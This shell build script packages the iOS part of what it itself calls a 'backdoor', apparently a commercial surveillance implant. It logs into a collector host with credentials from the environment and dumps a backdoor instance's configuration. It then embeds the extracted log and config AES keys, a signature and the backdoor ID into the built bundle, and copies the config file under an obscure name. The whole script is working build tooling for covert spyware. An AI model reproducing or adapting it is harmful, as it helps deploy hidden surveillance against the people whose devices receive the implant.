#
# setting env from project
#
SYNCH_DB=${RCS_TEST_SYNCH}
TOOL_DIR=${SRCROOT}/tools/
TOOL=${SRCROOT}/tools/rcs-core.rb
BUILD_CONF=${SRCROOT}/tools/build.json
HOST=${RCS_TEST_COLLECTOR}
USR=${RCS_TEST_USER}
PASS=${RCS_TEST_PASSWD}
INPUT=${TARGET_BUILD_DIR}/${TARGET_NAME}.${WRAPPER_EXTENSION}
DSYM_PATH=${TARGET_BUILD_DIR}/${TARGET_NAME}.${WRAPPER_EXTENSION}.dSYM
DSYM_PACK=${TARGET_NAME}.${WRAPPER_EXTENSION}.dSYM
OUTPUT_ZIP=${TARGET_BUILD_DIR}/ios.zip
OUTPUT_DIR=${TARGET_BUILD_DIR}/ios_package
INSTANCE=${RCS_TEST_INSTANCE}
INSTALL_FILE=${TARGET_BUILD_DIR}/ios_package/install.sh
DEBUG_DIR=${RCS_TEST_SHLIB_DIR}
CORE_BUILD_NAME=${TARGET_NAME}
IOS_DEVICE=${RCS_TEST_DEVICE_ADDRESS}

if [ "$SYNCH_DB" == "NO" ]
then
echo "don't synchronize core to DB." > /tmp/db_log.txt
exit
fi 

. ~/.env
export GEM_HOME=$GEM_HOME

echo "extracting keys from backdoor $INSTANCE configuration…"
$TOOL -d $HOST -u $USR -p $PASS -f $INSTANCE -S > /tmp/instance.txt 2>&1

cat /tmp/instance.txt | sed -n 's/.*-> LOGKEY   : //p' > $INPUT/logAesKey.txt
cat /tmp/instance.txt | sed -n 's/.*-> CONFKEY  : //p' > $INPUT/cfgAesKey.txt
cat /tmp/instance.txt | sed -n 's/.*-> SIGNATURE: //p' > $INPUT/signature.txt
echo $INSTANCE > $INPUT/backdoorId.txt

CONF_FILE=`cat $INPUT/../ios_package/install.sh | sed -n 's/RCS_CONF=//p'`
cp $INPUT/../ios_package/$CONF_FILE $INPUT/b2YC6yY6CFcc
